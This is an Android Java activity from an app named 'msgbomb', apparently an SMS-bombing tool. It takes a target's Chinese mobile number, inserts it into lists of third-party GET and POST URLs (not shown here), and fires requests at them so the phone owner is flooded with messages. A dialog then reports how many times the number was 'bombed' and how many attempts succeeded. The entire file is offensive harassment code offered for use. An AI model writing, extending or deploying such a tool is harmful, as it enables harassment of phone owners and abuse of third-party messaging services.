package com.example.msgbomb.activity;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.View;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.view.inputmethod.InputMethodManager;
import android.widget.*;
import com.example.msgbomb.R;
import com.example.msgbomb.service.HttpService;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MyActivity extends Activity {
    private EditText e_phoneNumber;
    private ImageButton b_attack;
    private static String[] getUrls;
    private static String[] postUrls;
    /**
     * Called when the activity is first created.
     */
    @Override
    public void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        e_phoneNumber = (EditText) findViewById(R.id.e_phoneNumber);
        b_attack = (ImageButton) findViewById(R.id.b_attack);
        getUrls = getResources().getStringArray(R.array.get);
        postUrls = getResources().getStringArray(R.array.post);
        //StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        //StrictMode.setThreadPolicy(policy);
        e_phoneNumber.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {

            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                String num = e_phoneNumber.getText().toString();
                if(num.length() >= 11 && validateNum(num) ){
                    InputMethodManager imm = (InputMethodManager)getSystemService(Context.INPUT_METHOD_SERVICE);
                    if (imm.isActive()) {
                        imm.toggleSoftInput(InputMethodManager.SHOW_IMPLICIT, InputMethodManager.HIDE_NOT_ALWAYS);
                    }
                }
            }

            @Override
            public void afterTextChanged(Editable s) {

            }
        });
        b_attack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String num = e_phoneNumber.getText().toString();
                boolean isSuitedNum = validateNum(num);
                if(isSuitedNum){
                    attack(num);
                    new AlertDialog.Builder(MyActivity.this).
                            setTitle("结果").
                            setMessage("就在刚刚，你已经对" + num+"实行轰炸"+ HttpService.getTotalAttack()+"次"
                                    +"\n成功次数：" + HttpService.getSucTotalAttack()
                                    +"\n失败次数："+ HttpService.getEroTotalAttack()).setPositiveButton("确定",new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {

                        }
                    }).create().show();
                }else{

                }
            }
        });
    }

    public void attack(final String num){
        //先执行后台逻辑再跑动画
        myStartAnimation(b_attack, R.anim.bombing);
        new Thread(new Runnable() {
            @Override
            public void run() {
                phone(num);
            }
        }).start();
    }

    public boolean validateNum(String num){
        if(num.length() == 0){
            bombToast("The Attacked Num can not be null!",false);
            return false;
        }
        Pattern p = Pattern.compile("^((13[0-9])|(15[^4,\\D])|(18[0,5-9]))\\d{8}$");
        Matcher m = p.matcher(num);
        boolean isMatch = m.matches();
        if(!isMatch){
            bombToast("please input the num in right pattern!",false);
        }
        return isMatch;
    }

    public void bombToast(String msg,boolean isLong){
        if(isLong){
            Toast.makeText(this, msg, Toast.LENGTH_LONG).show();
        }else{
            Toast.makeText(this,msg,Toast.LENGTH_SHORT).show();
        }
    }

    public void myStartAnimation(View v,int id){
        Animation bombing = AnimationUtils.loadAnimation(this,id);
        if(bombing != null){
            bombing.setAnimationListener(new Animation.AnimationListener() {
                @Override
                public void onAnimationStart(Animation animation) {
                    //bombToast("fighting...",false);
                }

                @Override
                public void onAnimationEnd(Animation animation) {
                    //bombToast("end",false);
                }

                @Override
                public void onAnimationRepeat(Animation animation) {
                    //bombToast("Repeat",false);
                }
            });
        }
        v.startAnimation(bombing);
    }

    public void phone(String num) {

        for (int i = 0; i < getUrls.length; i ++) {
            String u = getUrls[i];
            String t = u.replace("{tel}", num);
            String s = HttpService.sendGet(t);
        }

        for (int i = 0; i < postUrls.length; i ++) {
            String u = postUrls[i];
            String t = u.replace("{tel}", num);
            String [] args = t.split(" ");
            String returnInfo;
            if(args.length == 1){
                returnInfo =  HttpService.sendPost(args[0],null);
                return;
            }
            returnInfo = HttpService.sendPost(args[0], args[1]);
        }

    }

}
